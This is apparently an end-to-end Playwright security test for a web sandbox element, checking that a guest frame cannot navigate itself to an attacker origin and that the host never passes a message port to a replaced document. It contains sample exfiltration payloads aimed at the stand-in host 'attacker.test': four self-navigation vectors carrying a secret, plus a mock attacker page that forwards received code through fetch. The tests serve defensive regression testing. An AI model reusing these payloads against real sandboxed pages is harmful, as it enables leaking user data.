import type { BrowserContext } from '@playwright/test';
import { test, expect } from '../../../test/e2e/fixture';

/**
 * Research 14: the guest frame navigating itself (backlog S10 / S11, issue #6 N1 + N2).
 *
 * No CSP directive governs where a document may navigate itself, and the sandbox flags only stop
 * *top-level* navigation. Before the fix, `location.href = attacker + secret` carried data out, and
 * the host then handed a fresh MessagePort (plus queued execute() code) to the attacker's page.
 */

const ATTACKER = 'http://attacker.test';

// Records every request that reaches the attacker origin, and serves a page that grabs any port it is sent.
async function watchAttacker(context: BrowserContext): Promise<string[]> {
    const reached: string[] = [];
    await context.route(`${ATTACKER}/**`, route => {
        reached.push(route.request().url());
        return route.fulfill({
            contentType: 'text/html',
            body: `<script>
                addEventListener('message', e => {
                    if (e.data?.type !== 'INIT_PORT') return;
                    const port = e.ports[0];
                    port.postMessage({ type: 'LOG', level: 'log', args: ['ATTACKER_GOT_PORT'] });
                    port.onmessage = m => fetch('${ATTACKER}/leak?code=' + encodeURIComponent(m.data.code), { mode: 'no-cors' });
                });
            </script>`,
        });
    });
    return reached;
}

const VECTORS: Record<string, string> = {
    'script (location.href)': `<script>setTimeout(() => { location.href = '${ATTACKER}/?d=guest-secret'; }, 50)</script>`,
    'script (window.open _self)': `<script>setTimeout(() => { window.open('${ATTACKER}/?d=guest-secret', '_self'); }, 50)</script>`,
    'link click': `<a id="a" href="${ATTACKER}/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
    'meta refresh': `<meta http-equiv="refresh" content="0;url=${ATTACKER}/?d=guest-secret">`,
};

for (const [name, markup] of Object.entries(VECTORS)) {
    test(`14.1 self-navigation via ${name} does not reach the network`, async ({ sandbox, context, page }) => {
        const reached = await watchAttacker(context);
        await sandbox.mount();

        await sandbox.load(markup);
        await page.waitForTimeout(1500);

        expect(reached, 'the guest navigated itself to the attacker').toEqual([]);
    });
}

test('14.2 the host never hands a port to a second document in the frame', async ({ sandbox, context, page }) => {
    await watchAttacker(context);
    expect(await sandbox.mount()).toBe('ready');

    // Something replaces the document in the sandbox frame. The guest itself cannot reach the
    // host-owned frame any more, so simulate it from the host side.
    const outcome = await page.evaluate(() => new Promise<string>(resolve => {
        const s = document.querySelector('web-sandbox') as any;
        s.addEventListener('terminated', () => resolve('terminated'), { once: true });
        s.addEventListener('ready', () => resolve('ready-again'), { once: true });
        const frame = s.shadowRoot.querySelector('iframe') as HTMLIFrameElement;
        frame.srcdoc = '<p>a document the host did not write</p>';
        setTimeout(() => resolve('nothing'), 3000);
    }));

    expect(outcome).toBe('terminated');

    // queued or later code must not go anywhere
    await sandbox.run('console.log("after terminate")');
    await page.waitForTimeout(500);
    expect(await sandbox.logs()).not.toContain('after terminate');
    expect(await page.evaluate(() => (document.querySelector('web-sandbox') as any).shadowRoot.querySelector('iframe'))).toBeNull();
});
